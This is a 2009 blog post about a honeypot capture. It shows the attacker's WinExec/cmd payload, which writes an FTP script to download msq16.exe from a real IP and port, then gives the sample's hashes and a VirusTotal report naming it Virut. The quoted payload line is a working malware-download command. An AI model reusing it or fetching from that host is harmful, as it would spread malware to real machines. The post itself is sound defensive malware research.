---
title: "Iteolih: malicious ftp services"
date: "2009-07-26"
tags: 
  - "iteolih-d90"
---

Yesterday, I got an incomplete, but successful, attack on my honeypot, the attackers remote code execution looked like this:  

  

**WinExec("cmd /c echo open 78.1.96.200 4871 > o&echo user 1 1 >> o &echo get msq16.exe >> o")  
ExitThread(0)**  

  

  
As the required part to download the malware to the remotehost was incomplete, I got curious and wanted a copy.  

  
  

I did not expect downloading the malware getting a problem, as all information required was available, including host credentials and filename. But, as the ftp service embedded in the malware is still special, it was a problem.  
The ftp service [is designed to work with the windows ftp client](http://nepenthes.carnivore.it/documentation:modules:downloadhandler:download_ftp "nepenthes, ftp download problems"), the windows ftp only provides active ftp, active ftp does not work on nat if the ftp service port is not on default port 21. 
Apart from that, the ftp service may [fail with 6% of all ports](http://nepenthes.carnivore.it/news_archive:2006#a_common_bug "ftp PORT parsing 0xf").

  

I've had the same problems with nepenthes 3 years ago, but had the slight hope the malware authors might have fixed it in the meantime. Obviously I was wrong.

  

As I was looking for a more general solution than using netcat, I scripted a small ftp client in python, using pythons ftplib. Provided your external ip and a forwarded port range, the client is able to download files via active ftp from _Designed for Windows_ ™ ftp services.

  

You can download the script [here](http://svn.carnivore.it/browser/dump/ftpexe.py "ftpexe.py script"), verified to work with python3.x and 2.x.

  

  

After getting the file,

  

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

| msq16.exe |
| --- |
| File size: 550912 bytes |
| MD5   : 8d599fa3d633de4d24dea51af67a61c9 |
| SHA1  : f11188ad9501c1b6cdc051c6cd09776eec5b282e |
| SHA256: 75dd3c06d832a270e0838b3eaf87ad428f3bab16e2599a33c4415dc94362547c |

  

  

I sent it to virustotal.com, here is the report:

  

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

| Antivirus | Version | Last Update | Result |
| --- | --- | --- | --- |
| a-squared | 4.5.0.24 | 2009.07.25 | Trojan.Win32.Refroso!IK |
| AhnLab-V3 | 5.0.0.2 | 2009.07.25 | Win32/Virut.B |
| AntiVir | 7.9.0.228 | 2009.07.24 | W32/Virut.AX |
| Antiy-AVL | 2.0.3.7 | 2009.07.24 | \- |
| Authentium | 5.1.2.4 | 2009.07.25 | W32/Virut.7116 |
| Avast | 4.8.1335.0 | 2009.07.25 | Win32:Virtob |
| AVG | 8.5.0.387 | 2009.07.25 | Win32/Virut |
| BitDefender | 7.2 | 2009.07.25 | Trojan.Generic.2200851 |
| CAT-QuickHeal | 10.00 | 2009.07.25 | W32.Virut.Z |
| ClamAV | 0.94.1 | 2009.07.25 | W32.Virut-54 |
| Comodo | 1741 | 2009.07.25 | Worm.Win32.Email-Worm.generic.daisy-1529 |
| DrWeb | 5.0.0.12182 | 2009.07.25 | Trojan.KeyLogger.2526 |
| eSafe | 7.0.17.0 | 2009.07.23 | \- |
| eTrust-Vet | 31.6.6640 | 2009.07.25 | Win32/Virut.7115 |
| F-Prot | 4.4.4.56 | 2009.07.25 | W32/Virut.7116 |
| F-Secure | 8.0.14470.0 | 2009.07.25 | Virus.Win32.Virut.av |
| Fortinet | 3.120.0.0 | 2009.07.25 | W32/Virut.AV |
| GData | 19 | 2009.07.25 | Trojan.Generic.2200851 |
| Ikarus | T3.1.1.64.0 | 2009.07.25 | Trojan.Win32.Refroso |
| Jiangmin | 11.0.800 | 2009.07.25 | Win32/Virut.af |
| K7AntiVirus | 7.10.802 | 2009.07.25 | Virus.Win32.Virut.av |
| Kaspersky | 7.0.0.125 | 2009.07.25 | Virus.Win32.Virut.av |
| McAfee | 5688 | 2009.07.25 | W32/Virut.gen.a |
| McAfee+Artemis | 5688 | 2009.07.25 | W32/Virut.gen.a |
| McAfee-GW-Edition | 6.8.5 | 2009.07.25 | Heuristic.LooksLike.Trojan.Dropper.J |
| Microsoft | 1.4903 | 2009.07.25 | Virus:Win32/Virut.AC |
| NOD32 | 4277 | 2009.07.25 | Win32/Virut.AV |
| Norman |   
 | 2009.07.24 | W32/Virut.AG |
| nProtect | 2009.1.8.0 | 2009.07.25 | Virus/W32.Virut.K |
| Panda | 10.0.0.14 | 2009.07.25 | W32/Virutas.FG |
| PCTools | 4.4.2.0 | 2009.07.25 | Win32.Virut.Gen.4 |
| Prevx | 3.0 | 2009.07.25 | \- |
| Rising | 21.39.52.00 | 2009.07.25 | Win32.Virut.an |
| Sophos | 4.44.0 | 2009.07.25 | W32/Virut-W |
| Sunbelt | 3.2.1858.2 | 2009.07.25 | Win32.Virut.av (v) |
| Symantec | 1.4.4.12 | 2009.07.25 | W32.Virut.W |
| TheHacker | 6.3.4.3.373 | 2009.07.24 | W32/Virut.av |
| TrendMicro | 8.950.0.1094 | 2009.07.25 | PE\_VIRUT.AV |
| VBA32 | 3.12.10.9 | 2009.07.24 | Virus.Win32.Virut.2 |
| ViRobot | 2009.7.25.1853 | 2009.07.25 | Win32.Virut.S |
| VirusBuster | 4.6.5.0 | 2009.07.25 | Win32.Virut.Gen.4 |
